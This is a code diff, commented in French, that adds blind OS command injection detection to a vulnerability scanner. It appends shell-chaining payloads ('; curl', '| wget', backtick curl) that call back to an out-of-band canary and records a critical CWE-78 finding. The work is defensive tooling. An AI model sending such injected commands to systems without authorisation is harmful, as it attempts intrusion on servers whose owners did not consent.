@@ -18,6 +18,7 @@ import re
 
 from scanner.core import http
 from scanner.core.module_base import ScannerModule, Finding
+from scanner.core.oob import OOBCanary
 from scanner.payloads import get_payloads
 
 
@@ -53,6 +54,42 @@ class CommandInjectionModule(ScannerModule):
                 continue
             if base_r is None:
                 continue
+
+            # === Injection aveugle via rappel OOB (curl/wget vers le canary) ===
+            canary = OOBCanary.new(context)
+            if canary.url:
+                for tmpl in ("; curl {u}", "| wget -qO- {u}", "& curl {u}", "`curl {u}`"):
+                    np = dict(params)
+                    np[param_name] = base_value + tmpl.format(u=canary.url)
+                    try:
+                        http.get(urlunparse(parsed._replace(query=urlencode(np))), context,
+                                 timeout=8, headers={"User-Agent": "VulnScan/1.2"})
+                    except Exception:
+                        pass
+                left = http.time_left(context)
+                wait = 4 if left is None else min(4, left)
+                if wait > 0 and canary.wait_for_hit(context, timeout=wait):
+                    hit = canary.hits()[0] if canary.hits() else {}
+                    findings.append(Finding(
+                        type="command-injection", severity="critical",
+                        title="Injection de commande OS aveugle confirmée via OOB",
+                        description=(
+                            f"Paramètre '{param_name}' : le serveur a exécuté une commande qui "
+                            f"a appelé le canary {canary.url} (méthode {hit.get('method', '?')}). "
+                            "Exploitable même sans retour visible."
+                        ),
+                        recommendation=(
+                            "Ne JAMAIS passer une entrée utilisateur à shell_exec/exec/system. "
+                            "Utiliser les APIs natives."
+                        ),
+                        url=target, parameter=param_name,
+                        payload=f"{base_value}; curl {canary.url}",
+                        evidence=f"Hit OOB : {hit.get('method')} from {hit.get('ip')} UA={hit.get('user_agent', '')[:60]}",
+                        confidence=95, cwe_id="CWE-78", owasp_id="A03:2021", cvss_base=9.8,
+                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                        detection_method="oob-canary", source="module:command-injection",
+                    ))
+                    continue  # OOB prouvé pour ce param : inutile de fuzzer les signatures
 
             for entry in payloads:
                 payload, sig = entry["payload"], entry["signature"]
